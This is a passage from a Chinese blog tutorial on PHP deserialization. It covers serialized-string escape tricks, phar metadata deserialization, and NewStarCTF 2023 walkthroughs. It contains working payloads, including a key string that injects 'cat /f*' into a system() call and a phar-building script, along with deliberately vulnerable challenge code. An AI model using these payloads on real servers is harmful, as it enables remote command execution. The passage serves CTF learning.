<h4 id="2、当序列化的长度不对应的时候会出现报错"><a href="#2、当序列化的长度不对应的时候会出现报错" class="headerlink" title="2、当序列化的长度不对应的时候会出现报错"></a>2、当序列化的长度不对应的时候会出现报错</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">s</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$b</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">s</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;54656156135&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br><br>D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;&#125;<span class="hljs-keyword">bool</span>(<span class="hljs-literal">false</span>)<br><br>Process finished with <span class="hljs-keyword">exit</span> code <span class="hljs-number">0</span><br>可以看到，返回<span class="hljs-literal">false</span>，就是无法正常反序列化<br></code></pre></td></tr></table></figure>

<h4 id="3、可以反序列化类中不存在的元素"><a href="#3、可以反序列化类中不存在的元素" class="headerlink" title="3、可以反序列化类中不存在的元素"></a>3、可以反序列化类中不存在的元素</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">s</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$b</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">s</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;c&quot;;s:1:&quot;c&quot;;&#125;&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br><br>D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;&#125;<span class="hljs-keyword">object</span>(s)<span class="hljs-comment">#2 (3) &#123;</span><br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;a&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-literal">NULL</span><br>  [<span class="hljs-string">&quot;c&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;c&quot;</span><br>&#125;<br>看到类里面并没有c，但是能正常反序列化<br></code></pre></td></tr></table></figure>

<h3 id="PHP字符串逃逸"><a href="#PHP字符串逃逸" class="headerlink" title="PHP字符串逃逸"></a>PHP字符串逃逸</h3><p>字符串逃逸一般有两种情况，一种是字符串增多，一种是字符串减少</p>
<p>字符串逃逸的本质也是差不多就是闭合，有一种注入的感觉</p>
<h4 id="增多的情况"><a href="#增多的情况" class="headerlink" title="增多的情况"></a>增多的情况</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">s</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;666&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;b;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">s</span>(<span class="hljs-string">&quot;bad&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//echo waf(serialize($a));</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;bad&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;这是没有经过替换的</span><br><span class="hljs-comment">//O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;good&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;这是经过替换掉的</span><br>明显每替换一个，字符串长度就会+<span class="hljs-number">1</span>，那我们现在不像让b为<span class="hljs-number">666</span>，想让它是<span class="hljs-number">888</span>，但是b是不可控的，怎么办，那就是字符串逃逸了，我们看一下逃逸字符串的长度<span class="hljs-string">&quot;;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">888</span><span class="hljs-string">&quot;;&#125;，21个，长度为21.</span><br><span class="hljs-string">那就是21个bad就能让&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>;&#125;逃逸，即<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">s</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;666&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;b;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">s</span>(<span class="hljs-string">&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//echo serialize($a);</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:84:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;666&quot;;&#125;&#x27;</span>));<br><span class="hljs-comment">//for($i=0;$i&lt;21;$i++)&#123;</span><br><span class="hljs-comment">//  echo &#x27;bad&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-meta">?&gt;</span><br>运行结果：<br>D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">84</span>:<span class="hljs-string">&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;888&quot;</span>;&#125;<span class="hljs-string">&quot;;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">666</span><span class="hljs-string">&quot;;&#125;object(s)#2 (2) &#123;</span><br><span class="hljs-string">  [&quot;</span>a<span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  string(84) &quot;</span>goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood<span class="hljs-string">&quot;</span><br><span class="hljs-string">  [&quot;</span>b<span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  string(3) &quot;</span><span class="hljs-number">888</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">888666</span><br><span class="hljs-string">可以看到，成功替换。</span><br></code></pre></td></tr></table></figure>

<h4 id="减少的情况"><a href="#减少的情况" class="headerlink" title="减少的情况"></a>减少的情况</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-string">&quot;hao&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">s</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$b</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;b;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//这个是每替换一个就会减少一个字符，那就意味着我们需要让前面的吞掉后面的，再通过修改$b来实现我们的目的，让前面吞掉&quot;;s:1:&quot;b&quot;;s:21:，来实现我们的目的，这个原理与增加相似，反过来就行。</span><br><span class="hljs-variable">$a</span> =<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">s</span>(<span class="hljs-string">&#x27;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&#x27;</span>,<span class="hljs-string">&#x27;&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//echo serialize($a);</span><br><span class="hljs-comment">//echo (waf(serialize($a)));</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:1:&quot;s&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao&quot;;s:1:&quot;b&quot;;s:21:&quot;&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:3:&quot;888&quot;;&#125;&#x27;</span>));<br><span class="hljs-comment">//for($i=0;$i&lt;17;$i++)&#123;</span><br><span class="hljs-comment">//  echo &#x27;good&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-meta">?&gt;</span><br>运行结果：<br>D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="hljs-number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php<br><span class="hljs-keyword">object</span>(s)<span class="hljs-comment">#2 (2) &#123;</span><br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">64</span>) <span class="hljs-string">&quot;haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;888&quot;</span><br>&#125;<br><span class="hljs-number">888</span><span class="hljs-string">&quot;;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">888</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">Process finished with exit code 0</span><br><span class="hljs-string">成功替换。</span><br></code></pre></td></tr></table></figure>

<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><h3 id="小试牛刀—–-NewStarCTF-2023-公开赛道-逃（增）"><a href="#小试牛刀—–-NewStarCTF-2023-公开赛道-逃（增）" class="headerlink" title="小试牛刀—–[NewStarCTF 2023 公开赛道]逃（增）"></a>小试牛刀—–[NewStarCTF 2023 公开赛道]逃（增）</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);s<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])))); <br><br>可以看到，每将一个bad替换成一个good，字符串长度+<span class="hljs-number">1</span>，key是可控的<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;GetFlag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;bad&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;whoami&quot;</span>;&#125;这是传入一个bad的序列化的内容，现在我们不想执行whoami这个命令，就要把;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;whoami&quot;</span>;&#125;给顶出去。<br>目的字符串：O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;GetFlag&quot;</span>:<span class="hljs-number">2</span>：&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;bad&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:6:&quot;</span>whoami<span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cmd&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;有<span class="hljs-number">22</span>个字符，然后把<span class="hljs-number">22</span>个bad替换掉后，就是增加了<span class="hljs-number">22</span>个字符，那么ls就可以执行<br>当前目录下没有，直接查根目录，原理一样<br>?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:7:&quot;</span>cat /f*<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h4 id="什么是phar文件"><a href="#什么是phar文件" class="headerlink" title="什么是phar文件"></a>什么是phar文件</h4><p>phar文件就是类似于java的jar的那种类型的压缩文件，它可以将多个php文件的代码压缩成一个phar，无需解压，PHP就可以进行访问并执行内部语句。</p>
<h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>. stub <span class="hljs-comment">//phar文件头</span><br>    phar文件的标志，也可以理解为phar的文件头<br>    这个Stub其实就是一个简单的PHP文件，必须是 xxx<span class="hljs-meta">&lt;?php</span> xxx; <span class="hljs-title function_ invoke__">__HALT_COMPILER</span>();<span class="hljs-meta">?&gt;</span> 这种格式，必须有<span class="hljs-title function_ invoke__">__HALT_COMPILER</span>()，没有这个，PHP就无法识别出它是Phar文件。其他的无所谓。<br><span class="hljs-number">2</span>. manifest <span class="hljs-comment">//压缩文件的信息</span><br>    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这个meta-data就是用户自己定义的元数据，在这里用户自定义的元数据就是以序列化的形式存在的，这是漏洞利用最核心的地方。如下图。<br></code></pre></td></tr></table></figure>

<p><img src="C:\Users\杨沛欣\AppData\Roaming\Typora\typora-user-images\image-20240716105756715.png" alt="image-20240716105756715"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">3</span>. content <span class="hljs-comment">//压缩文件的内容</span><br>    被压缩文件的内容<br><span class="hljs-number">4</span>. <span class="hljs-title function_ invoke__">signature</span> (可空) <span class="hljs-comment">//签名</span><br>    签名，放在末尾。<br></code></pre></td></tr></table></figure>

<h4 id="phar反序列化-1"><a href="#phar反序列化-1" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p>Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>,PHP使用<code>phar_parse_metadata</code>在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1、phar文件能够上传至服务器<br>2、要有可控的参数，像元数据那种，并且、/、phar等特殊字符没有被过滤<br>3、php.ini中的phar.readonly选项，需要为Off（默认是on）。<br></code></pre></td></tr></table></figure>

<h4 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;qwq&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> `cmd`;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>(); <span class="hljs-comment">//创建一个flag的对象</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;A.phar&#x27;</span>); <span class="hljs-comment">//创建一个phar对象，这一行代码创建了一个新的 Phar 对象。Phar 是 PHP 中用于创建和操作 PHP 归档文件（PHAR 文件）的一个类。</span><br><span class="hljs-comment">//功能：new Phar(&quot;phar.phar&quot;)  文件名后缀必须是phar</span><br><span class="hljs-comment">//参数：&quot;phar.phar&quot; 是正在创建或打开的 PHAR 文件的名称。如果该文件不存在，则会创建一个新的文件。</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>(); <span class="hljs-comment">//开启缓存，在 Phar 对象上调用 startBuffering() 方法可以确保所有的更改在实际写入文件之前都会先被缓冲。这意味着在 stopBuffering() 之前的所有操作都不会立即生效，而是暂时存储在内存中。</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//向 PHAR 文件中添加一个新的文件。addFromString 方法用于从字符串内容创建一个文件并将其添加到 PHAR 文件中。&quot;test.txt&quot; 是文件名，&quot;test&quot; 是文件内容。这一行代码并不是必须的。它的作用是向 PHAR 文件中添加一个名为 test.txt 的文件，并将其内容设置为 &quot;test&quot;。如果你不需要向 PHAR 文件中添加任何文件，这一行代码可以省略。</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//这一行代码设置了 PHAR 文件的存根（stub）。setStub 方法用于定义 PHAR 文件的入口代码。&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot; 是一个 PHP 指令，表示停止编译器。此代码在 PHAR 文件执行时首先运行。有时候会有文件头检测，如果有文件头检测可以加上文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//设置元数据，setMetadata 方法用于给 PHAR 文件添加元数据。这里将 TestObject 对象 $a 作为元数据添加到 PHAR 文件中。</span><br><span class="hljs-comment">//自动计算签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">//这一行代码停止缓冲操作并将所有缓冲的更改写入 PHAR 文件。stopBuffering 方法会将之前缓冲的所有更改实际写入到 PHAR 文件中，使更改生效。</span><br></code></pre></td></tr></table></figure>

<p>不过如果php.ini的phar.readonly处于on状态的话，是不允许生成phar文件的，cmd执行php –ini，就可以找到这个php.ini的文件路径，将php.ini里面的<code>phar.readonly</code>选项设置为<code>Off</code>。<code>并把分号去掉。</code></p>
<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><h3 id="小试牛刀—–-NewStarCTF-2023-公开赛道-PharOne"><a href="#小试牛刀—–-NewStarCTF-2023-公开赛道-PharOne" class="headerlink" title="小试牛刀—–[NewStarCTF 2023 公开赛道]PharOne"></a>小试牛刀—–[NewStarCTF 2023 公开赛道]PharOne</h3><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407160957424.png" alt="img"></p>
<p>查看源码，得到提示，&#x2F;class.php</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161000091.png" alt="img"></p>
<p>访问看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br></code></pre></td></tr></table></figure>

